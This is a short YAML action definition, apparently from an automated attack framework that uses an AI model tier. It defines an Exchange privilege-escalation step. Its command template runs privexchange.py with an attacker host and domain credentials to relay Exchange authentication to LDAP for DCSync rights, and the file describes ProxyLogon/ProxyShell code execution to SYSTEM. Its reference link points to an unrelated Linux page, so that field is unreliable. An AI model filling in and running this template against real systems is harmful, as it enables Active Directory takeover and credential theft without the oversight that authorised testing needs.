name: exchange_privesc
category: ad
description: Exchange privilege escalation (PrivExchange/ProxyLogon)
preconditions:
- domain_joined
parameters:
  target_ip: from_engagement.target_ip
command_template: python3 privexchange.py -ah {attacker_ip} {target_ip} -u '{username}'
  -p '{password}' -d {domain}
parser: generic_parser
expected_effects:
- action_completed
falsifier:
  pattern: error|failed|refused|denied
  timeout: 30
model_tier: haiku
mechanism: 'Exchange servers have high AD privileges. PrivExchange: relay Exchange
  auth to LDAP for DCSync rights. ProxyLogon/ProxyShell: RCE on Exchange → SYSTEM
  on domain-joined server.'
hacktricks_ref: linux-hardening/privilege-escalation/interesting-groups-linux-pe/README.md
